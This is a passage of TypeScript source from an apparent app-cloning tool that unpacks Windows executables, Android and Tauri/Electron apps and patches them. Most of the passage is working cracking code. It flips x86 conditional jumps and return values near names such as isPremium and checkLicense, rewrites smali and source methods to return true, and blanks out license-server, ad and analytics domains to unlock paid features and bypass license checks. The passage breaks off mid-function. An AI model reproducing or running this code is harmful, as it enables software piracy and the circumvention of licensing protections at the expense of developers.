  const allFiles = readDirRecursive(decompDir);

  for (const filePath of allFiles) {
    const baseName = path.basename(filePath);
    try {
      let content = fs.readFileSync(filePath, "utf-8");
      const original = content;

      // Android strings.xml
      if (baseName.startsWith("strings") && filePath.endsWith(".xml")) {
        content = content.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${newName}</string>`);
      }
      // iOS Info.plist
      if (baseName === "Info.plist") {
        content = content.replace(/(<key>CFBundleDisplayName<\/key>\s*<string>)[^<]*(<\/string>)/, `$1${newName}$2`);
        content = content.replace(/(<key>CFBundleName<\/key>\s*<string>)[^<]*(<\/string>)/, `$1${newName}$2`);
      }
      // package.json (React Native / Electron)
      if (baseName === "package.json") {
        try {
          const pkg = JSON.parse(content);
          if (pkg.displayName || pkg.name) {
            if (pkg.displayName) pkg.displayName = newName;
            content = JSON.stringify(pkg, null, 2);
          }
        } catch { /* not valid json */ }
      }
      // .NET AssemblyInfo
      if (baseName.includes("AssemblyInfo")) {
        content = content.replace(/(AssemblyTitle\(")[^"]*("\))/, `$1${newName}$2`);
        content = content.replace(/(AssemblyProduct\(")[^"]*("\))/, `$1${newName}$2`);
      }

      if (content !== original) {
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`📝 اسم → "${newName}": ${path.relative(decompDir, filePath)}`);
      }
    } catch { /* skip */ }
  }

  return mods;
}

// ════════════════════════════════════════════════════════════════
// Clone App — REAL: extract → binary patch → modify resources → rebuild
// ════════════════════════════════════════════════════════════════

export interface CloneOptions {
  removeAds: boolean;
  unlockPremium: boolean;
  removeTracking: boolean;
  removeLicenseCheck: boolean;
  changeAppName?: string;
  changePackageName?: string;
  customInstructions?: string;
}

function find7zz(): string | null {
  const staticPath = path.join(os.tmpdir(), "7zip-bin", "7zz");
  if (fs.existsSync(staticPath)) return staticPath;
  try {
    const sys = execSync("which 7z 2>/dev/null || which 7zz 2>/dev/null", { timeout: 5000 }).toString().trim();
    if (sys) return sys;
  } catch {}
  try {
    const downloadDir = path.join(os.tmpdir(), "7zip-bin");
    fs.mkdirSync(downloadDir, { recursive: true });
    execSync(`curl -sL "https://github.com/ip7z/7zip/releases/download/24.09/7z2409-linux-x64.tar.xz" -o "${downloadDir}/7z.tar.xz" && cd "${downloadDir}" && tar xf 7z.tar.xz`, { timeout: 30000 });
    if (fs.existsSync(staticPath)) return staticPath;
  } catch {}
  return null;
}

type ExeSubType = "nsis" | "electron" | "tauri" | "dotnet" | "native";

function detectExeSubType(buf: Buffer): ExeSubType {
  const scanLen = Math.min(buf.length, 500000);
  const sample = buf.toString("binary", 0, scanLen).toLowerCase();
  if (sample.includes("nullsoft") || sample.includes("nsis")) return "nsis";
  const fullBin = buf.toString("binary").toLowerCase();
  if (fullBin.includes("nullsoft") || fullBin.includes("nsis installer") || fullBin.includes("nsis-")) return "nsis";
  if (fullBin.includes("__tauri") || fullBin.includes(".taubndl") || fullBin.includes("tauri::")) return "tauri";
  if (fullBin.includes("electron") || fullBin.includes(".asar") || fullBin.includes("node_modules")) return "electron";
  if (detectDotNet(buf)) return "dotnet";
  return "native";
}

interface ExtractedExe {
  extractDir: string;
  subType: ExeSubType;
  innerSubType?: ExeSubType;
  innerExe?: string;
  resourceFiles: string[];
}

async function realExtractEXE(fileBuffer: Buffer, workDir: string): Promise<ExtractedExe> {
  const extractDir = path.join(workDir, "extracted");
  const resourceFiles: string[] = [];
  fs.mkdirSync(extractDir, { recursive: true });

  const tmpExe = path.join(workDir, "original.exe");
  fs.writeFileSync(tmpExe, fileBuffer);

  let subType = detectExeSubType(fileBuffer);
  let innerExe: string | undefined;
  let innerSubTypeDetected: ExeSubType | undefined;

  const sevenZip = find7zz();
  if (sevenZip) {
    try {
      execSync(`"${sevenZip}" x "${tmpExe}" -o"${extractDir}" -y 2>/dev/null`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 });
      const extracted = readDirRecursive(extractDir);
      resourceFiles.push(...extracted);
      const innerExeFile = extracted.find(f => f.endsWith(".exe") && f !== tmpExe && !f.includes("$PLUGINSDIR"));
      if (innerExeFile) {
        innerExe = innerExeFile;
        const innerBuf = fs.readFileSync(innerExeFile);
        const innerType = detectExeSubType(innerBuf);
        innerSubTypeDetected = innerType;
        if (innerType !== "native") {
          subType = subType === "nsis" ? subType : innerType;
        }
        const innerExtract = path.join(workDir, "inner-extracted");
        fs.mkdirSync(innerExtract, { recursive: true });
        try {
          execSync(`"${sevenZip}" x "${innerExeFile}" -o"${innerExtract}" -y 2>/dev/null`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 });
          const innerFiles = readDirRecursive(innerExtract);
          resourceFiles.push(...innerFiles);
        } catch {}

        if (innerType === "tauri" || innerType === "electron") {
          const resDir = path.join(workDir, "web-resources");
          fs.mkdirSync(resDir, { recursive: true });
          const webFiles = extractEmbeddedWebResources(innerBuf, resDir);
          resourceFiles.push(...webFiles);
        }
      }
    } catch {}
  }

  if ((subType === "tauri" || subType === "electron") && !innerExe) {
    const resDir = path.join(workDir, "web-resources");
    fs.mkdirSync(resDir, { recursive: true });
    const webFiles = extractEmbeddedWebResources(fileBuffer, resDir);
    resourceFiles.push(...webFiles);
  }

  return { extractDir, subType, innerSubType: innerSubTypeDetected, innerExe, resourceFiles };
}

function extractEmbeddedWebResources(buf: Buffer, outDir: string): string[] {
  const files: string[] = [];
  const htmlDocs: Array<{ start: number; end: number; content: string }> = [];
  for (let i = 0; i < buf.length - 15; i++) {
    if (buf.toString("ascii", i, i + 15) === "<!DOCTYPE html>") {
      let end = i;
      for (let j = i; j < Math.min(i + 500000, buf.length) - 7; j++) {
        if (buf.toString("ascii", j, j + 7) === "</html>") { end = j + 7; break; }
      }
      if (end > i + 50) {
        htmlDocs.push({ start: i, end, content: buf.toString("utf8", i, end) });
      }
    }
  }
  htmlDocs.forEach((h, idx) => {
    const fPath = path.join(outDir, `index${idx > 0 ? idx : ""}.html`);
    fs.writeFileSync(fPath, h.content, "utf-8");
    files.push(fPath);
  });

  const jsChunks: Array<{ start: number; len: number; content: string }> = [];
  let currentStart = -1;
  const textStart = Math.floor(buf.length * 0.6);
  for (let i = textStart; i < buf.length; i++) {
    const b = buf[i];
    if ((b >= 32 && b <= 126) || b === 10 || b === 13 || b === 9) {
      if (currentStart === -1) currentStart = i;
    } else {
      if (currentStart !== -1 && (i - currentStart) > 500) {
        const content = buf.toString("utf8", currentStart, i);
        if (content.includes("function") || content.includes("import ") || content.includes("export ") ||
            content.includes("const ") || content.includes("addEventListener") || content.includes("window.")) {
          jsChunks.push({ start: currentStart, len: i - currentStart, content });
        }
      }
      currentStart = -1;
    }
  }
  jsChunks.sort((a, b) => b.len - a.len);
  jsChunks.slice(0, 10).forEach((c, idx) => {
    const fPath = path.join(outDir, `bundle${idx > 0 ? idx : ""}.js`);
    fs.writeFileSync(fPath, c.content, "utf-8");
    files.push(fPath);
  });

  return files;
}

interface TauriEmbeddedAsset {
  offset: number;
  compressedSize: number;
  decompressedSize: number;
  content: string;
  type: "html" | "js" | "css" | "other";
}

function findTauriBrotliAssets(buf: Buffer): TauriEmbeddedAsset[] {
  const zlib = require("zlib");
  const assets: TauriEmbeddedAsset[] = [];
  const tried = new Set<number>();
  const searchOffsets: number[] = [];
  const foundOffsets = new Set<number>();

  const markers = ["index.html", "/index.html", "<!DOCTYPE", ".taubndl", "__TAURI", "tauri://"];
  for (const m of markers) {
    let pos = 0;
    while ((pos = buf.indexOf(Buffer.from(m), pos)) !== -1 && pos < buf.length) {
      for (let pad = -128; pad <= 128; pad++) {
        const off = pos + m.length + pad;
        if (off > 0 && off < buf.length) searchOffsets.push(off);
      }
      for (let pad = -128; pad <= 128; pad++) {
        const off = pos + pad;
        if (off > 0 && off < buf.length) searchOffsets.push(off);
      }
      pos++;
    }
  }

  const textStart = Math.floor(buf.length * 0.5);
  for (let i = textStart; i < buf.length - 100; i += 4096) {
    searchOffsets.push(i);
  }

  for (const off of searchOffsets) {
    if (tried.has(off) || off >= buf.length - 10) continue;
    tried.add(off);

    let alreadyCovered = false;
    for (const fo of foundOffsets) {
      if (off >= fo && off < fo + 10000) { alreadyCovered = true; break; }
    }
    if (alreadyCovered) continue;

    try {
      const slice = buf.slice(off, Math.min(off + 2000000, buf.length));
      const result = zlib.brotliDecompressSync(slice);
      if (result.length > 50) {
        const text = result.toString("utf8", 0, Math.min(500, result.length));
        let type: TauriEmbeddedAsset["type"] = "other";
        if (text.includes("<!DOCTYPE") || text.includes("<html")) type = "html";
        else if (text.includes("function") || text.includes("const ") || text.includes("var ") || text.includes("=>") || text.includes("import ")) type = "js";
        else if (text.includes("{") && (text.includes("color:") || text.includes("display:"))) type = "css";

        if (type !== "other") {
          const compEnd = findBrotliEnd(buf, off, result.length);
          foundOffsets.add(off);
          assets.push({
            offset: off,
            compressedSize: compEnd - off,
            decompressedSize: result.length,
            content: result.toString("utf8"),
            type,
          });
        }
      }
    } catch {}
  }

  return assets;
}

function findBrotliEnd(buf: Buffer, start: number, decompSize: number): number {
  const zlib = require("zlib");
  let lo = start + Math.floor(decompSize * 0.01);
  let hi = Math.min(start + decompSize * 2, buf.length);
  let best = hi;

  for (let size = lo - start; size <= hi - start; size += 64) {
    try {
      const slice = buf.slice(start, start + size);
      const r = zlib.brotliDecompressSync(slice);
      if (r.length >= decompSize) {
        best = start + size;
        break;
      }
    } catch {
      continue;
    }
  }
  return best;
}

function patchTauriEmbeddedAssets(buf: Buffer, options: CloneOptions): { patched: Buffer; mods: string[] } {
  const zlib = require("zlib");
  const mods: string[] = [];
  const result = Buffer.from(buf);
  const assets = findTauriBrotliAssets(buf);

  if (assets.length === 0) return { patched: result, mods };

  mods.push(`🔍 وُجد ${assets.length} asset(s) مضمّن (Tauri/brotli)`);

  for (const asset of assets) {
    let modified = false;
    let content = asset.content;
    const origContent = content;

    if (asset.type === "html") {
      if (options.removeTracking) {
        const trackingScripts = [
          /https?:\/\/[^"'\s]*(?:posthog|analytics|amplitude|mixpanel|segment|sentry|hotjar|clarity)[^"'\s]*/gi,
          /<script[^>]*(?:analytics|tracking|gtag|ga\.js|gtm\.js)[^>]*>[\s\S]*?<\/script>/gi,
        ];
        for (const pat of trackingScripts) {
          const before = content;
          content = content.replace(pat, (m) => " ".repeat(m.length));
          if (content !== before) { modified = true; mods.push(`📡 HTML: أُزيلت سكريبتات تتبع`); }
        }
      }

      if (options.unlockPremium || options.removeLicenseCheck) {
        const appUrlPattern = /const\s+APP_URL\s*=\s*"(https?:\/\/[^"]+)"/;
        const match = content.match(appUrlPattern);
        if (match) {
          mods.push(`⚠️ تطبيق WebView — يحمّل من سيرفر خارجي: ${match[1]}`);
          mods.push(`⚠️ الحماية server-side — التعديل يتطلب اعتراض الشبكة أو تعديل السيرفر`);
        }
      }
    }

    if (asset.type === "js") {
      if (options.removeAds) {
        const adPatterns = [
          /(?:loadAd|showAd|loadInterstitial|showInterstitial|loadBanner|showBanner|showRewardedAd)\s*\([^)]*\)/gi,
          /["'](?:ca-app-pub|pub-\d+|adUnitId)["']/gi,
        ];
        for (const pat of adPatterns) {
          const before = content;
          content = content.replace(pat, (m) => `""/*${m.slice(0,10)}*/`);
          if (content !== before) { modified = true; mods.push(`🚫 JS: أُزيلت إعلانات مضمّنة`); }
        }
      }

      if (options.unlockPremium) {
        const premiumPatterns = [
          { re: /(?:isPremium|isPaid|isSubscribed|isPro|isVip|hasPurchased|isUnlocked|canAccessFeature|hasActiveSubscription)\s*[=:]\s*(?:false|!1)\b/gi, rep: (m: string) => m.replace(/(?:false|!1)/, "true") },
          { re: /(?:isTrialExpired|isFreeTier|needsUpgrade|shouldShowPaywall|isExpired)\s*[=:]\s*(?:true|!0)\b/gi, rep: (m: string) => m.replace(/(?:true|!0)/, "false") },
          { re: /(?:isPremium|isPaid|isSubscribed|isPro|isVip|hasPurchased|isUnlocked|canAccessFeature|hasActiveSubscription)\s*\(\)\s*\{[^}]{0,200}return\s+(?:false|!1)/gi, rep: (m: string) => m.replace(/return\s+(?:false|!1)/, "return true") },
          { re: /(?:isTrialExpired|isFreeTier|needsUpgrade|shouldShowPaywall|isExpired)\s*\(\)\s*\{[^}]{0,200}return\s+(?:true|!0)/gi, rep: (m: string) => m.replace(/return\s+(?:true|!0)/, "return false") },
          { re: /["']free["']\s*(?:===|==)\s*(?:planType|plan|userPlan|currentPlan)/gi, rep: (m: string) => `"pro"==${m.split(/===|==/)[1]}` },
          { re: /(?:planType|plan|userPlan|currentPlan)\s*(?:===|==)\s*["']free["']/gi, rep: (m: string) => `${m.split(/===|==/)[0]}==="pro"` },
        ];
        for (const { re, rep } of premiumPatterns) {
          const before = content;
          content = content.replace(re, rep as any);
          if (content !== before) { modified = true; mods.push(`🔓 JS: فُتحت ميزات مدفوعة (premium patch)`); }
        }
      }

      if (options.removeLicenseCheck) {
        const licensePatterns = [
          { re: /(?:checkLicense|verifyLicense|validateLicense|isLicensed|isActivated|isRegistered)\s*\(\)\s*\{[^}]{0,300}return\s+(?:false|!1)/gi, rep: (m: string) => m.replace(/return\s+(?:false|!1)/, "return true") },
          { re: /(?:checkExpiry|validateKey|verifyKey|checkSerial)\s*\([^)]*\)\s*\{[^}]{0,300}return\s+(?:false|!1)/gi, rep: (m: string) => m.replace(/return\s+(?:false|!1)/, "return true") },
        ];
        for (const { re, rep } of licensePatterns) {
          const before = content;
          content = content.replace(re, rep as any);
          if (content !== before) { modified = true; mods.push(`🔑 JS: تم تجاوز فحص الرخصة`); }
        }
      }

      if (options.removeTracking) {
        const trackPatterns = [
          /(?:posthog|analytics|amplitude|mixpanel|segment)\.(?:capture|track|identify|page|screen|group)\s*\([^)]*\)/gi,
          /(?:gtag|ga|fbq|ttq)\s*\(\s*["'][^"']*["']/gi,
        ];
        for (const pat of trackPatterns) {
          const before = content;
          content = content.replace(pat, (m) => `void 0/*${m.slice(0,15)}*/`);
          if (content !== before) { modified = true; mods.push(`📡 JS: عُطّل تتبع مضمّن`); }
        }
      }
    }

    if (modified && content.length === origContent.length) {
      try {
        const recompressed = zlib.brotliCompressSync(Buffer.from(content, "utf8"), {
          params: { [zlib.constants.BROTLI_PARAM_QUALITY]: 11 },
        });
        if (recompressed.length <= asset.compressedSize) {
          const padded = Buffer.alloc(asset.compressedSize, 0x00);
          recompressed.copy(padded);
          padded.copy(result, asset.offset);
          mods.push(`✅ Asset مضمّن أُعيد ضغطه وحُقن بنجاح (${asset.type})`);
        } else {
          mods.push(`⚠️ Asset ${asset.type}: التعديل أكبر من الأصلي — تم الاحتفاظ بالتعديلات النصية فقط`);
        }
      } catch (e: any) {
        mods.push(`⚠️ فشل إعادة ضغط asset: ${e.message}`);
      }
    } else if (modified) {
      mods.push(`⚠️ Asset ${asset.type}: التعديل غيّر الحجم — يتطلب إعادة بناء هيكل الملف`);
    }
  }

  return { patched: result, mods };
}

function binaryPatchRemoveAds(buf: Buffer): { patched: Buffer; mods: string[] } {
  const mods: string[] = [];
  const result = Buffer.from(buf);

  const adDomains = [
    "googleads.g.doubleclick.net", "pagead2.googlesyndication.com",
    "ads.google.com", "ad.doubleclick.net", "admob",
    "facebook.com/tr", "analytics.facebook.com",
    "ads.unity3d.com", "unityads.unity3d.com",
    "applovin.com", "adjust.com/", "app.adjust.",
    "mopub.com", "inmobi.com", "startapp.com",
    "chartboost.com", "vungle.com", "ironsource.com",
    "adcolony.com", "tapjoy.com",
  ];
  for (const domain of adDomains) {
    const domainBuf = Buffer.from(domain, "ascii");
    let pos = 0;
    while (pos < result.length - domainBuf.length) {
      const idx = result.indexOf(domainBuf, pos);
      if (idx === -1) break;
      const replacement = Buffer.alloc(domainBuf.length, 0x30);
      replacement.copy(result, idx);
      mods.push(`🚫 حُذف رابط إعلان: ${domain} @ 0x${idx.toString(16)}`);
      pos = idx + domainBuf.length;
    }
  }

  const adFunctions = ["loadAd", "showAd", "loadInterstitial", "showInterstitial", "loadBanner", "showBanner", "loadRewardedAd", "showRewardedAd"];
  for (const fn of adFunctions) {
    const fnBuf = Buffer.from(fn, "ascii");
    let pos = 0;
    let count = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;
      const nopFn = Buffer.alloc(fnBuf.length, 0x5F);
      Buffer.from("_nop_").copy(nopFn);
      nopFn.copy(result, idx);
      count++;
      pos = idx + fnBuf.length;
    }
    if (count > 0) mods.push(`🚫 عُطّلت دالة إعلان: ${fn} (${count}x)`);
  }

  return { patched: result, mods };
}

function binaryPatchUnlockPremium(buf: Buffer): { patched: Buffer; mods: string[] } {
  const mods: string[] = [];
  const result = Buffer.from(buf);

  const premiumStrings = [
    "isPremium", "isPaid", "isSubscribed", "isPro", "isVip",
    "hasPurchased", "isUnlocked", "checkLicense", "isTrialExpired",
    "isFreeTier", "needsUpgrade", "shouldShowPaywall", "canAccessFeature",
    "hasActiveSubscription", "isRegistered", "validateLicense",
  ];
  for (const fn of premiumStrings) {
    const fnBuf = Buffer.from(fn, "utf8");
    let pos = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;

      for (let scan = Math.max(0, idx - 200); scan < Math.min(result.length - 2, idx + 200); scan++) {
        if (result[scan] === 0x74) {
          result[scan] = 0xEB;
          mods.push(`🔓 JE→JMP (patch تخطي فحص): ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
        if (result[scan] === 0x0F && result[scan + 1] === 0x84) {
          result[scan] = 0x90;
          result[scan + 1] = 0xE9;
          mods.push(`🔓 JZ→JMP (patch تخطي فحص): ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
      }
      pos = idx + fnBuf.length;
    }
  }

  const negativeReturns = ["isTrialExpired", "isFreeTier", "needsUpgrade", "shouldShowPaywall", "isExpired"];
  for (const fn of negativeReturns) {
    const fnBuf = Buffer.from(fn, "utf8");
    let pos = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;

      for (let scan = idx + fnBuf.length; scan < Math.min(result.length - 4, idx + 500); scan++) {
        if (result[scan] === 0xB8 && result[scan + 1] === 0x01 && result[scan + 2] === 0x00 && result[scan + 3] === 0x00 && result[scan + 4] === 0x00) {
          result[scan + 1] = 0x00;
          mods.push(`🔓 return 1→0: ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
      }
      pos = idx + fnBuf.length;
    }
  }

  const positiveReturns = ["isPremium", "isPaid", "isSubscribed", "isPro", "isVip", "hasPurchased", "isUnlocked", "canAccessFeature", "hasActiveSubscription", "isRegistered"];
  for (const fn of positiveReturns) {
    const fnBuf = Buffer.from(fn, "utf8");
    let pos = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;

      for (let scan = idx + fnBuf.length; scan < Math.min(result.length - 4, idx + 500); scan++) {
        if (result[scan] === 0xB8 && result[scan + 1] === 0x00 && result[scan + 2] === 0x00 && result[scan + 3] === 0x00 && result[scan + 4] === 0x00) {
          result[scan + 1] = 0x01;
          mods.push(`🔓 return 0→1: ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
        if (result[scan] === 0x31 && result[scan + 1] === 0xC0) {
          result[scan] = 0xB0;
          result[scan + 1] = 0x01;
          mods.push(`🔓 xor eax,eax→mov al,1: ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
      }
      pos = idx + fnBuf.length;
    }
  }

  return { patched: result, mods };
}

function binaryPatchRemoveTracking(buf: Buffer): { patched: Buffer; mods: string[] } {
  const mods: string[] = [];
  const result = Buffer.from(buf);

  const trackingDomains = [
    "google-analytics.com", "analytics.google.com",
    "firebaselogging", "firebase-settings",
    "app-measurement.com", "crashlytics.com",
    "amplitude.com", "api.amplitude.com",
    "api.mixpanel.com", "api.segment.io",
    "sentry.io", "app.posthog.com",
    "posthog.com", "t.co/i/adsct", "tr.snapchat.com",
    "hotjar.com", "clarity.ms", "plausible.io",
  ];
  for (const domain of trackingDomains) {
    const domainBuf = Buffer.from(domain, "ascii");
    let pos = 0;
    while (pos < result.length - domainBuf.length) {
      const idx = result.indexOf(domainBuf, pos);
      if (idx === -1) break;
      Buffer.alloc(domainBuf.length, 0x30).copy(result, idx);
      mods.push(`📡 حُذف تتبع: ${domain} @ 0x${idx.toString(16)}`);
      pos = idx + domainBuf.length;
    }
  }

  const trackFunctions = ["logEvent", "trackEvent", "sendAnalytics", "setUserProperty", "recordEvent", "trackScreen"];
  for (const fn of trackFunctions) {
    const fnBuf = Buffer.from(fn, "ascii");
    let pos = 0, count = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;
      Buffer.alloc(fnBuf.length, 0x5F).copy(result, idx);
      count++;
      pos = idx + fnBuf.length;
    }
    if (count > 0) mods.push(`📡 عُطّلت دالة تتبع: ${fn} (${count}x)`);
  }

  return { patched: result, mods };
}

function binaryPatchRemoveLicense(buf: Buffer): { patched: Buffer; mods: string[] } {
  const mods: string[] = [];
  const result = Buffer.from(buf);

  const licenseFunctions = [
    "checkLicense", "verifyLicense", "validateLicense", "isLicensed",
    "isActivated", "checkSignature", "verifySignature", "isRegistered",
    "checkExpiry", "validateKey", "verifyKey", "checkSerial",
    "checkActivation", "validateSerial",
  ];
  for (const fn of licenseFunctions) {
    const fnBuf = Buffer.from(fn, "utf8");
    let pos = 0;
    while (pos < result.length - fnBuf.length) {
      const idx = result.indexOf(fnBuf, pos);
      if (idx === -1) break;

      for (let scan = Math.max(0, idx - 200); scan < Math.min(result.length - 2, idx + 200); scan++) {
        if (result[scan] === 0x74) {
          result[scan] = 0xEB;
          mods.push(`🔑 JE→JMP تخطي رخصة: ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
        if (result[scan] === 0x75) {
          result[scan] = 0xEB;
          mods.push(`🔑 JNE→JMP تخطي رخصة: ${fn} @ 0x${scan.toString(16)}`);
          break;
        }
      }
      pos = idx + fnBuf.length;
    }
  }

  const licenseUrls = ["license.check", "api.license", "activate.license", "verify.license", "registration.check"];
  for (const url of licenseUrls) {
    const urlBuf = Buffer.from(url, "ascii");
    let pos = 0;
    while (pos < result.length - urlBuf.length) {
      const idx = result.indexOf(urlBuf, pos);
      if (idx === -1) break;
      Buffer.alloc(urlBuf.length, 0x30).copy(result, idx);
      mods.push(`🔑 حُذف رابط رخصة: ${url} @ 0x${idx.toString(16)}`);
      pos = idx + urlBuf.length;
    }
  }

  return { patched: result, mods };
}

function binaryPatchChangeAppName(buf: Buffer, newName: string): { patched: Buffer; mods: string[] } {
  const mods: string[] = [];
  const result = Buffer.from(buf);

  const peOff = buf.readUInt32LE(0x3C);
  if (peOff > 0 && peOff < buf.length - 200) {
    const rsrcRVA = buf.readUInt32LE(peOff + 24 + 112);
    if (rsrcRVA > 0) {
      mods.push(`📝 PE resource section found at RVA 0x${rsrcRVA.toString(16)}`);
    }
  }

  const versionInfoPatterns = ["FileDescription", "ProductName", "InternalName"];
  for (const pat of versionInfoPatterns) {
    const patBuf16 = Buffer.alloc(pat.length * 2);
    for (let i = 0; i < pat.length; i++) {
      patBuf16.writeUInt16LE(pat.charCodeAt(i), i * 2);
    }
    let pos = 0;
    while (pos < result.length - patBuf16.length) {
      const idx = result.indexOf(patBuf16, pos);
      if (idx === -1) break;

      let valStart = idx + patBuf16.length;
      while (valStart < Math.min(result.length - 2, idx + 200)) {
        if (result[valStart] !== 0x00 || result[valStart + 1] !== 0x00) break;
        valStart += 2;
      }
      if (valStart < result.length - 4 && result[valStart] !== 0x00) {
        let valEnd = valStart;
        while (valEnd < Math.min(result.length - 2, valStart + 200)) {
          if (result[valEnd] === 0x00 && result[valEnd + 1] === 0x00) break;
          valEnd += 2;
        }
        const oldName = result.toString("utf16le", valStart, valEnd);
        const maxLen = Math.floor((valEnd - valStart) / 2);
        const truncName = newName.slice(0, maxLen);
        const nameBuf = Buffer.alloc(valEnd - valStart, 0x00);
        for (let i = 0; i < truncName.length; i++) {
          nameBuf.writeUInt16LE(truncName.charCodeAt(i), i * 2);
        }
        nameBuf.copy(result, valStart);
        mods.push(`📝 ${pat}: "${oldName}" → "${truncName}"`);
      }
      pos = idx + patBuf16.length;
    }
  }

  return { patched: result, mods };
}

function patchResourceFiles(files: string[], options: CloneOptions): string[] {
  const mods: string[] = [];
  for (const filePath of files) {
    const ext = path.extname(filePath).toLowerCase();
    if (![".js", ".ts", ".html", ".css", ".json", ".xml", ".swift", ".java", ".kt", ".cs", ".plist", ".mq4", ".mq5", ".smali"].includes(ext)) continue;
    try {
      const stat = fs.statSync(filePath);
      if (stat.size > 2 * 1024 * 1024 || stat.size === 0) continue;
      let content = fs.readFileSync(filePath, "utf-8");
      const original = content;
      const relPath = filePath.split("/").slice(-3).join("/");

      if (options.removeAds) {
        const adPatterns = [
          /(?:loadAd|showAd|loadInterstitial|showInterstitial|loadBanner|showBanner|loadRewardedAd|showRewardedAd)\s*\(/gi,
          /(?:admob|adsense|adsbygoogle|googletag|adUnit|bannerAd|interstitialAd)\s*[=\.\(]/gi,
          /import\s+.*(?:admob|ads|adview|interstitial|banner|AdMob|AppLovin|IronSource|UnityAds|MoPub).*$/gim,
          /<[^>]*(?:com\.google\.ads|admob|ad_unit|adView|AdView|banner_ad|interstitial_ad)[^>]*\/?>/gi,
          /invoke-[a-z]+\s+\{[^}]*\},\s*L(?:com\/google\/android\/gms\/ads|com\/facebook\/ads|com\/unity3d\/ads)[^\n]*/gi,
        ];
        for (const pat of adPatterns) {
          content = content.replace(pat, (m) => {
            if (ext === ".smali") return `# [HAYO-AD-REMOVED] ${m}`;
            if (ext === ".xml") return `<!-- [HAYO-AD-REMOVED] -->`;
            return `/* [HAYO-AD-REMOVED] */ // ${m}`;
          });
        }
      }

      if (options.unlockPremium) {
        const premiumMethods = ["isPremium", "isPaid", "isSubscribed", "isPro", "isVip", "hasPurchased", "isUnlocked", "checkLicense", "isTrialExpired", "isFreeTier", "needsUpgrade", "shouldShowPaywall", "canAccessFeature", "hasActiveSubscription"];

        if (ext === ".smali") {
          for (const method of premiumMethods) {
            const methodRegex = new RegExp(`\\.method[^\\n]*(${method})[^\\n]*\\n([\\s\\S]*?)\\.end method`, "g");
            content = content.replace(methodRegex, (match, mn) => {
              const header = match.split("\n")[0];
              if (header.includes(")Z") || header.includes(")I")) {
                const isNeg = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(mn);
                return `${header}\n    .locals 1\n    # [HAYO-UNLOCKED] ${mn}\n    const/4 v0, ${isNeg ? "0x0" : "0x1"}\n    return v0\n.end method`;
              }
              return match;
            });
          }
        } else if ([".java", ".kt", ".swift", ".js", ".ts", ".cs"].includes(ext)) {
          for (const method of premiumMethods) {
            const patterns = [
              new RegExp(`((?:public|private|protected|internal)?\\s*(?:static\\s+)?(?:fun|boolean|Bool|bool)\\s+${method}\\s*\\([^)]*\\)\\s*(?::\\s*(?:Boolean|Bool|boolean))?\\s*\\{)([\\s\\S]*?)(\\})`, "g"),
              new RegExp(`((?:async\\s+)?(?:function\\s+)?${method}\\s*\\([^)]*\\)\\s*(?::\\s*boolean)?\\s*\\{)([\\s\\S]*?)(\\})`, "gi"),
            ];
            for (const regex of patterns) {
              content = content.replace(regex, (match, header, body, close) => {
                const isNeg = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(method);
                return `${header}\n    // [HAYO-UNLOCKED] ${method}\n    return ${isNeg ? "false" : "true"};\n${close}`;
              });
            }
          }
        }
      }

      if (options.removeTracking) {
        const trackPatterns = [
          /(.*(?:logEvent|trackEvent|sendAnalytics|setUserProperty|recordEvent|trackScreen|analytics\.track)\s*\(.*)/gi,
          /^(import\s+.*(?:Firebase|Analytics|Crashlytics|Amplitude|Mixpanel|Flurry|Adjust).*)$/gim,
          /(invoke-[^\n]*(?:Firebase|Analytics|Crashlytics|logEvent|trackEvent|Amplitude|Mixpanel)[^\n]*)/gi,
        ];
        for (const pat of trackPatterns) {
          content = content.replace(pat, (m) => {
            if (ext === ".smali") return `# [HAYO-TRACKING-OFF] ${m}`;
            return `// [HAYO-TRACKING-OFF] ${m}`;
          });
        }
      }

      if (options.removeLicenseCheck) {
        const licenseMethods = ["checkLicense", "verifyLicense", "validateLicense", "isLicensed", "isActivated", "checkSignature", "verifySignature", "isRegistered", "checkExpiry", "validateKey"];
        if ([".java", ".kt", ".swift", ".js", ".ts", ".cs"].includes(ext)) {
          for (const method of licenseMethods) {
            const regex = new RegExp(`((?:public|private|protected|internal)?\\s*(?:static\\s+)?(?:fun|boolean|Bool|bool|void)\\s+${method}\\s*\\([^)]*\\)\\s*(?::\\s*(?:Boolean|Bool|boolean|Unit|void))?\\s*\\{)([\\s\\S]*?)(\\})`, "g");
            content = content.replace(regex, (match, header, body, close) => {
              if (header.includes("boolean") || header.includes("Bool")) {
                return `${header}\n    // [HAYO-LICENSE-BYPASS]\n    return true;\n${close}`;
              }
              return `${header}\n    // [HAYO-LICENSE-BYPASS] skipped\n${close}`;
            });
          }
        }
      }

      if (options.changeAppName) {
        const baseName = path.basename(filePath);
        if (baseName.startsWith("strings") && ext === ".xml") {
          content = content.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${options.changeAppName}</string>`);
        }
        if (baseName === "Info.plist") {
          content = content.replace(/(<key>CFBundleDisplayName<\/key>\s*<string>)[^<]*(<\/string>)/, `$1${options.changeAppName}$2`);
          content = content.replace(/(<key>CFBundleName<\/key>\s*<string>)[^<]*(<\/string>)/, `$1${options.changeAppName}$2`);
        }
        if (baseName === "package.json") {
          try {
            const pkg = JSON.parse(content);
            if (pkg.displayName || pkg.name) {
              if (pkg.displayName) pkg.displayName = options.changeAppName;
              if (pkg.productName) pkg.productName = options.changeAppName;
